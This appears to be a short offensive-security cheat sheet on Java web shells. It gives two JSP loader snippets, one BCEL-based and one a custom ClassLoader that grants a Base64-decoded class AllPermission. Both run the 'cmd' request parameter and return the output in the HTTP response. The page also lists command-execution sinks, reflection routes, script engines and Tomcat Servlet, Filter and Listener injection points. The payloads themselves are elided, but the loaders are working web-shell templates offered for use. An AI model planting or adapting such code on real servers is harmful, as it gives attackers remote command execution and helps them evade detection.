WebShell
========================================

BCEL bytecode
----------------------------------------
.. code :: java

String bcelCode = "...";
response.getOutputStream().write(String.valueOf(new ClassLoader().loadClass(bcelCode).getConstructor(String.class).newInstance(request.getParameter("cmd")).toString()).getBytes());

Custom class loader
----------------------------------------
.. code :: java

response.getOutputStream().write(new ClassLoader() {
@Override
public Class<?> loadClass(String name) throws ClassNotFoundException {
if (name.contains("shell")) {
return findClass(name);
}
return super.loadClass(name);
}

@Override
protected Class<?> findClass(String name) throws ClassNotFoundException {
try {
byte[] bytes = Base64.getDecoder().decode("...");
PermissionCollection pc = new Permissions();
pc.add(new AllPermission());
ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(null, (Certificate[]) null), pc, this, null);
return this.defineClass(name, bytes, 0, bytes.length, protectionDomain);
} catch (Exception e) {
e.printStackTrace();
}
return super.findClass(name);
}
}.loadClass("shell").getConstructor(String.class).newInstance(request.getParameter("cmd")).toString().getBytes());
%>

Execute command variants
----------------------------------------
- java.lang.ProcessBuilder#start
- java.lang.Runtime#exec
- TemplatesImpl

Based on reflection
----------------------------------------
- class.forName
- MethodAccessor.invoke
- Method.invoke

Other Shell variants
----------------------------------------
- java.beans.Expression
- java.lang.ClassLoader
- java.net.URLClassLoader
- jdk.nahorn.internal.runtime.Scriptloader
- ObjectInputStream.resolveClass
- ScriptEngine.eval
- ScriptEngineManager
- Toolprovider

Tomcat container
----------------------------------------
- Servlet
- Filter
- Listener
